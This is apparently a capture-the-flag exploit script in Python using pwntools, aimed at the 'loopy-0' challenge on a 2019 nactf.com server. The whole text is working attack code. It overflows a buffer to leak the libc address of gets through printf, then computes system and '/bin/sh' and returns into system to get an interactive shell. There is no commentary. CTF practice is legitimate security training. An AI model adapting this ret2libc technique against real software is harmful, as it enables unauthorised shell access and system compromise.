from pwn import *

libc = ELF('libc.so.6')
gets_offset = libc.symbols['gets']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search('/bin/sh'))

# s = process('./loopy-0')
s = remote('shell.2019.nactf.com', 31283)
raw_input('debug')
printf_plt = 0x8049030
gets_got = 0x804c010
main = 0x80491e7 
offset = 0x4c
payload = 'a'*0x4c
payload += p32(printf_plt)
payload += p32(main)
payload += p32(gets_got)
payload += 'bbbb'
payload += p32(0x0)
s.sendline(payload)
s.recvuntil('bbbb')
add_gets = s.recv(4)
add_gets = u32(add_gets)
print "add: %x" % add_gets

base_add = add_gets - gets_offset
system_add = base_add + system_offset
binsh_add = base_add + binsh_offset

payload = 'a'*0x4c
payload += p32(system_add)
payload += p32(main)
payload += p32(binsh_add)
s.sendline(payload)
s.interactive()
